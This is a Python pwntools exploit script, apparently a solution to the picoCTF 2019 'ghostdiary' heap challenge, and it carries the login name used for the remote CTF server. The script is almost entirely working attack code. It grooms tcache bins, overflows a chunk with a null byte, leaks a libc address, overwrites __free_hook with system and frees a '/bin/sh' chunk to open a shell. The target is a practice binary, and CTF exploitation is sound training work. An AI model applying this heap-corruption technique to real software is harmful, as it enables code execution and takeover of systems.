from pwn import *

e = ELF("./ghostdiary")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.binary = e.path

if "--remote" in sys.argv:
  s = ssh(host="2019shell1.picoctf.com", user="gamester543", password="")
  p = s.process("/problems/ghost-diary_3_ef159a8a880a083c73a2bb724fc0bfcb/ghostdiary")
else:
  p = process(e.path,
  )
  #{"LD_PRELOAD": libc.path})

def alloc(size, payload="AAAA"):
  p.sendline("1")
  p.sendlineafter(">", "2" if size > 0x100 else "1")
  p.sendlineafter(":", str(size))
  p.recvuntil(">")

def edit(idx, payload="AAAA"):
  p.sendline("2")
  p.sendlineafter(":", str(idx))
  p.sendafter(":", payload)
  p.recvuntil(">")

def free(idx):
  p.sendline("4")
  p.sendlineafter(":", str(idx))
  p.recvuntil(">")

p.recvuntil(">")

for i in range(7):
  alloc(0x118)

alloc(0x118) # 7
alloc(0x118) # 8
alloc(0x118) # 9
alloc(0x30)

for i in range(7):
  alloc(0x88)

edit(8, "A" * 0xf0 + p64(0x100) + "\n")

gdb.attach(p)

for i in range(7):
  free(i)
free(8)

edit(7, "A" * 0x118)

# Get a leak now because we forgot to do it earlier. This also is in chunk B.
alloc(0x88)
p.sendline("3")
p.sendlineafter(":", "0")
p.recvuntil(": ")
leak = u64(p.recvline(keepends=False).ljust(8, "\x00")) - 0x7f4592fbfd90 + 0x00007f4592bd4000
print("{:#x}").format(leak)
p.recvuntil(">")

alloc(0x30)

for i in range(11, 18):
  free(i)

free(0)
free(9)

free(1)

alloc(0x128)
edit(0, "/bin/sh".ljust(0x88, "\x00") + p64(0x1337) + p64(leak + libc.symbols["__free_hook"]) + "\n")
alloc(0x30)
alloc(0x30)
edit(2, p64(leak + libc.symbols["system"]) + "\n")

p.sendline("4")
p.sendlineafter(":", "0")

p.interactive()
